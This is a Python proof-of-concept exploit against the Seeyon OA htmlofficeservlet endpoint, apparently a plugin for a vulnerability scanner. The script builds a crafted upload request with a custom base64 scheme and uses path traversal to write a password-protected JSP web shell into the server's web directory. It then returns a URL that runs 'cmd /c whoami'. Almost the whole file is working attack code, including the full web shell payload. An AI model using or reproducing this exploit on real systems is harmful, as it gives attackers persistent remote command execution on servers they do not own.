#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

import base64
import requests
import hashlib
from urllib.parse import urlparse
from plugin.random_ua import get_random_ua

def f_base64decode(cipherlist):
    base64list = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
    length = len(cipherlist)
    group = length / 4
    s = ''
    string = ''

    for i in range(int(group) - 1):
        j = i * 4
        s = cipherlist[j:j + 4]
        string += chr(((base64list.index(s[0])) << 2) + ((base64list.index(s[1])) >> 4))
        string += chr(((base64list.index(s[1]) & 0x0f) << 4) + ((base64list.index(s[2])) >> 2))
        string += chr(((base64list.index(s[2]) & 0x03) << 6) + ((base64list.index(s[3]))))
    j = (group - 1) * 4
    print(j)
    s = cipherlist[int(j):int(j) + 4]
    string += chr(((base64list.index(s[0])) << 2) + ((base64list.index(s[1])) >> 4))
    if s[2] == '6':
        return string
    else:
        string += chr(((base64list.index(s[1]) & 0x0f) << 4) + ((base64list.index(s[2])) >> 2))
    if s[3] == '6':
        return string
    else:
        string += chr(((base64list.index(s[2]) & 0x03) << 6) + ((base64list.index(s[3]))))
        return string

def f_base64encode(input_str):
    base64list = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
    str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
                      for i in input_str]
    output_str = ''
    equal_num = 0
    while str_ascii_list:
        temp_list = str_ascii_list[:3]
        if len(temp_list) != 3:
            while len(temp_list) < 3:
                equal_num += 1
                temp_list += ['0' * 8]
        temp_str = ''.join(temp_list)
        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
        temp_str_list = [int(x, 2) for x in temp_str_list]
        if equal_num:
            temp_str_list = temp_str_list[0:4 - equal_num]
        output_str += ''.join([base64list[x] for x in temp_str_list])
        str_ascii_list = str_ascii_list[3:]
    output_str = output_str + '6' * equal_num
    # print(output_str)
    return output_str

def poc(url):
    # url = "www.example.org/default.html?ct=32&op=92&item=98"
    # --> http://www.example.org
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    url = o.scheme + "://" + o.netloc
    headers = {
        "User-Agent":get_random_ua()
        }
    
    # shell_name can modify it yourself
    shell_name="config_db1.jsp"

    shell_url = url + "/seeyon/" + shell_name

    try:
        # just prevent being attacked
        res = requests.get(shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False)
        if res.status_code == 200 and ":-)" in res.text:
            return shell_url+'?pwd=fuckxxxx&cmd=cmd /c whoami'
    except:
        pass

    shell_name = "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\" + shell_name
    # def_shell content can modufy iy youself
    def_shell = """<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("fuckxxxx".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>"""
    def_shell = def_shell.encode()
    base_header = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkZUFENXlSUUh3TG9pcVJqaWRnNjYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo="

    payload_head_len = 283 + len(f_base64encode(shell_name))
    payload_shell_len = len(def_shell)
    payload_shell = def_shell + bytes(hashlib.md5(def_shell).hexdigest(), 'utf-8')
    payload_shell_name = f_base64encode(shell_name)
    payload = bytes(base64.b64decode(base_header).decode().replace('355', str(payload_head_len)).replace('666', str(
        payload_shell_len)).replace('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeAD5yRQHwLoiqRjidg66',
                                    payload_shell_name), 'utf-8') + payload_shell
    try:
        requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload, headers=headers, timeout=5, allow_redirects=False, verify=False)
        res = requests.get(url=shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False).text
    except:
        return False

    if ":-)" in res:
        return shell_url+'?pwd=fuckxxxx&cmd=cmd /c whoami'
    else:
        return False
